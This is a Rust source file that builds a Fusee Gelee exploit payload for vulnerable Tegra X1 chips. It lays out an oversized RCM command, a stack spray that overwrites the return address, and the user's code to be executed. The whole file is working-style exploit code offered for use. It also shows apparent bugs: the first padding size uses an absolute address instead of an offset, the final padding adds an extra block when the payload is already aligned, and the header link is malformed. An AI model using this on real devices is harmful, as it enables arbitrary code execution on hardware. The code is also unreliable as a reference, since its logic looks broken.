//! `Fusee` builds a payload which can be used to exploit a vulnerable
//! Tegra X1 using the [Fusee Gelee exploit](https;//github.com/Qyriad/fusee-launcher].
//!
//! A payload has the following structure:
//! 1. RCM command that includes the maximum length, ensuring that we can
//! send as much as possible.
//! 2. The stack spray  to override the return address.
//! 3. The program which should be executed.
//! 4. The payload is padded to be evenly divisible by the 0x1000 block size.

use bytes::{BufMut, Bytes, BytesMut};

const LENGTH: u32 = 0x30298;

// The address where the RCM payload is placed.
// This is fixed for most device.
const RCM_PAYLOAD_ADDR: u32 = 0x40010000;

// The address where the user payload is expected to begin.
const PAYLOAD_START_ADDR: u32 = 0x40010E40;

// Specify the range of addresses where we should inject the
// payload address.
const STACK_SPRAY_START: u32 = 0x40014E40;
const STACK_SPRAY_END: u32 = 0x40017000;

/// Builds the payload that executes the given code using the Fusee
/// Gelee exploit.
pub fn build_payload(code: Bytes) -> Bytes {
    let mut payload = BytesMut::new();

    payload.put_u32_le(LENGTH);

    let padding = b"\0".repeat(PAYLOAD_START_ADDR as usize - payload.len());
    payload.put_slice(padding.as_slice());

    let padding_size = STACK_SPRAY_START - PAYLOAD_START_ADDR;
    let mut code = code;
    let second_part = code.split_off(padding_size as usize);
    payload.put(code);

    let repeat_count = ((STACK_SPRAY_END - STACK_SPRAY_START) / 4) as u32;
    for _ in 0..repeat_count {
        payload.put_u32_le(RCM_PAYLOAD_ADDR);
    }

    payload.put(second_part);

    let padding_size = 0x1000 - (payload.len() % 0x1000);
    let padding = b"\0".repeat(padding_size);
    payload.put_slice(padding.as_slice());

    payload.freeze()
}
